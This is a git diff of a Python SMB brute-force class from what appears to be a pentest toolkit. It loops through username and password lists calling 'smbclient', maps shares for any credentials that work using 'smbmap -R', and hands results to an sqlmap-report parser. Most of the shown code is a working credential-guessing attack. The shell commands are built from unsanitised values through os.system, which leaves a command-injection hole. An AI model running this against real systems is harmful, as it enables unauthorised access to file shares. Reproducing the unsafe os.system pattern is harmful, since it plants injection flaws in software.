@@ -3,9 +3,10 @@
 import os
 import argparse
 import sys
+import extrac_dir_file_bruteforce
 
 class smbbruteforce:
-    def bruteforce(self, ip, username, password):
+    def bruteforce(self, id_j ,ip, username, password):
         found = []
         try:
             users = open(username, 'r')
@@ -29,6 +30,7 @@ class smbbruteforce:
                 if os.system("smbclient -L {} -U {}%{}".format(ip, u, p)) == 256:
                     for p in passwd:
                         try:
+                            print("test "+ u +" on password "+ p)
                             if os.system("smbclient -L {} -U {}%{}".format(ip, u, p)) != 256:
                                 found.append("{}:{}".format(u, p))
                         except:
@@ -50,6 +52,9 @@ class smbbruteforce:
                 print("[*] SHARES FOR USER : \033[30;42m {} \033[m  AND PASSWORD : \033[30;42m {} \033[m".format(u, p))
                 os.system("smbmap -R -u {} -p {} -H {} -g > report_brute.txt".format(u, p, ip, ))
                 print("+----------------------------------------------------------------------+")
+
+            parsing_sqlmap = extrac_dir_file_bruteforce.parsing_sqlmap()
+            parsing_sqlmap.parsing_sqlmap_report(id_j)
 
         print("\n")
 
